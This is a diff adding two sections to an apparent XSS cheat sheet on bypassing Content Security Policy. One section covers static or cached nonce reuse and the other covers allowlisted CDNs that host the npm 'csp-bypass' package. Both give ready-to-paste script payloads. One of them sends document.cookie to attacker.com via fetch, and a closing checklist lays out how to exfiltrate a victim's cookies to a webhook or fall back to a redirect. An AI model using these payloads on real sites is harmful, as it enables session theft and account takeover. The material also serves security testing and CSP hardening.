@@ -522,6 +522,38 @@ onload (on svg root)
 
 ## CSP Bypass Techniques
 
+### CSP Nonce Reuse / Stale Nonce
+
+**Context**: CSP uses `script-src 'nonce-xxx'` but the nonce value is static, cached, or predictable.
+
+**Detection**:
+1. Make 3+ requests to the same page — compare the nonce value each time
+2. If nonce is identical across requests, it's **static** (trivially bypassable)
+3. Check if nonce appears in cached responses (CDN, reverse proxy)
+4. Check if nonce is derived from predictable values (timestamp, session ID)
+
+**Exploit** (static nonce):
+```html
+<!-- Read nonce from page source, inject script with same nonce -->
+<script nonce="STATIC_NONCE_VALUE">alert(document.cookie)</script>
+```
+
+**Exploit** (nonce in cached response):
+```html
+<!-- Fetch the page to extract nonce, then inject with that nonce -->
+<script>
+fetch('/page').then(r=>r.text()).then(t=>{
+  const nonce = t.match(/nonce="([^"]+)"/)[1];
+  const s = document.createElement('script');
+  s.nonce = nonce;
+  s.textContent = 'alert(document.cookie)';
+  document.body.appendChild(s);
+});
+</script>
+```
+
+**Why It Works**: CSP nonces are designed to be unique per-response. When reused, any XSS injection point can simply include the known nonce value.
+
 ### CSP Policy Injection
 
 **Example**: Reflected XSS protected by CSP, with CSP bypass
@@ -628,6 +660,45 @@ Content-Security-Policy: script-src 'self' https://trusted-site.com
 ```html
 <script src="https://trusted-site.com/jsonp?callback=alert"></script>
 ```
+
+### CDN Allowlist Bypass via npm Packages
+
+**Concept**: When CSP whitelists an entire CDN origin (e.g., `cdn.jsdelivr.net`, `cdnjs.cloudflare.com`, `unpkg.com`), any npm package hosted there can be loaded — including packages designed to bypass CSP.
+
+**Example CSP**:
+```http
+Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net
+```
+
+**Key Package**: `csp-bypass` on npm provides multiple bypass variants:
+- `classic.js` — Uses `eval()` (fails if CSP lacks `'unsafe-eval'`)
+- **`sval-classic.js`** — Bundles a full JS interpreter (sval), bypasses `eval()` restriction
+- Both scan DOM for elements with `csp` or `csp-base64` attributes and execute the content
+
+**Payload (with eval restriction)**:
+```html
+<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js"></script>
+<br csp-base64="BASE64_ENCODED_JS_PAYLOAD">
+```
+
+**Payload (without eval restriction)**:
+```html
+<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/classic.js"></script>
+<br csp="fetch('https://attacker.com?c='+document.cookie)">
+```
+
+**Why It Works**:
+- CDN allowlist permits loading ANY package from the CDN
+- `sval-classic.js` interprets JS without `eval()`, so `'unsafe-eval'` is not needed
+- Attacker embeds JS in a DOM attribute, sval reads and executes it
+- Works for stored XSS where bot/victim visits page with injected content
+
+**Checklist when encountering CDN in CSP**:
+1. Check if `connect-src` is set — if absent (and no `default-src`), outbound fetch is unrestricted
+2. Use `sval-classic.js` variant (not `classic.js`) when `'unsafe-eval'` is missing
+3. Base64-encode the payload in `csp-base64` attribute for cleaner injection
+4. Exfiltrate via `fetch()` to webhook/collaborator if `connect-src` is open
+5. Use `document.location` redirect as fallback if `connect-src` blocks fetch
 
 ### Base Tag Hijacking
 
